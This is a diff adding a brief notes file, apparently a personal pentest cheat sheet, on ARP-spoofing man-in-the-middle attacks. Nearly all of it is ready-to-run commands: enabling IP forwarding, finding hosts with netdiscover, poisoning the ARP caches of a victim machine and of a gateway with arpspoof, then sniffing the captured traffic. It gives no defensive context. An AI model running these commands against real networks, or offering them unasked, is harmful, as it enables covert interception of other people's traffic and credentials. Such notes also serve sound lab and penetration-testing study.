@@ -1,0 +1,22 @@
+ARPspoofing - ARP Spoofing with arpspoof
+
++ ARP - Address Resolution Protocol to resolve MAC addresses to IP addresses
+
++ To enable packet flow through your machine during MITM attack
+	#sysctl -w net.ipv4.ip_forward=1
+
++ Using netdiscover to identify devices in the network
+	#netdiscover -r [cidr of the network]
+	#netdiscover -r 192.168.202.1/24
+
++ Tricking the target victim machine
+	#arpspoof -i [interface name] -t [target ip address] [default gateway]
+	#arpspoof -i eth0 -t 192.168.202.142 192.168.202.2
+	
++ Tricking the router machine
+	#arpspoof -i [interface name] -t [router ip address] [target ip address]
+	#arpspoof -i eth0 -t 192.168.202.2 192.168.202.142
+	
++ Now we are now actively MITM victim machine
+
++ To start sniffing packet you can use wireshark, tcpdump or any packet capture tool you're familiar with
